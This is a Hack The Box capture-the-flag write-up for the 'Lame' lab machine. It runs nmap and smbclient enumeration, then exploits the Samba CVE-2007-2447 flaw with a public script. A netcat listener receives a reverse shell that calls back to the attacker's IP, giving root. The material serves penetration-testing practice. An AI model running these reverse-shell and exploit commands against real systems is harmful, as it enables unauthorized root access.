# HTB Lame Writeup

Machine: Lame | OS: Linux | Difficulty: Easy | IP: 10.129.66.104

## Enumeration

Ran nmap with -Pn flag:

```bash
nmap -Pn -sC -sV 10.129.66.104
```

Found open ports:
- Port 21: vsftpd 2.3.4 (FTP)
- Port 22: OpenSSH 4.7p1
- Port 139: Samba smbd 3.0.20-Debian
- Port 445: Samba smbd 3.0.20-Debian

Checked SMB shares:

```bash
smbclient -L //10.129.66.104 -N --option='client min protocol=NT1'
```

Found tmp, print$, and admin shares.

## Exploitation

Samba 3.0.20-Debian is vulnerable to CVE-2007-2447. Found public exploit on GitHub.

Set up listener:

```bash
nc -lvnp 5555
```

Ran exploit:

```bash
python usermap_script.py 10.129.66.104 139 10.10.14.60 5555
```

Got reverse shell connection.

Verified access:

```bash
whoami
```

Output:

root


Immediate root access achieved.

## Summary

CVE-2007-2447 allowed unauthenticated RCE through Samba 3.0.20. Achieved root access directly without privilege escalation. Ancient Samba version running with root privileges made this a critical vulnerability.
